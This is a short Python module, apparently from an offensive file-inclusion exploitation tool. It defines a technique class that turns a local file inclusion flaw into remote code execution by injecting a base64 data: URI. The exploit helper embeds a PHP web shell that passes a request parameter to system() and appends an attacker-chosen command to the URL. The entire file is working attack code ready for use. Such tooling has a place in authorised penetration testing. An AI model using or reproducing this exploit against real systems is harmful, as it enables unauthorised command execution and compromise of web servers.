from core.techniques.LFIExec import LFIExec

from base64 import b64encode

class LFIDataURI (LFIExec):
    files_exec = [
        # input
        { 'path' : '', 'type' : 'data_uri' },
    ]

    # find LFI code execution path
    def check (self):
        return super(LFIDataURI, self)._check (prepare_check_data_uri)

    # do exec
    def exploit (self, cmd):
        return super(LFIDataURI, self)._exploit (prepare_exec_data_uri, cmd)
        
def prepare_check_data_uri (lfi, payload):
    purl = lfi.pattern_url[:]
    payload = 'data:text/plain;base64,' + b64encode (payload)
    # payload = 'data:text/plain,' + payload
    url = purl.replace (lfi.payload_placeholder, payload)
    return url

def prepare_exec_data_uri (lfi, cmd):
    purl = lfi.pattern_url[:]
    payload_exec = '<?php echo "' + lfi.tag_start_exec + '"; system ($_GET["cmd"]); echo "' + lfi.tag_end_exec + '"; ?>'
    payload = 'data:text/plain;base64,{0}&cmd={1}'.format (b64encode (payload_exec), cmd)
    # payload = 'data:text/plain,{0}&cmd={1}'.format (payload_exec, cmd)
    url = purl.replace (lfi.payload_placeholder, payload)
    return url
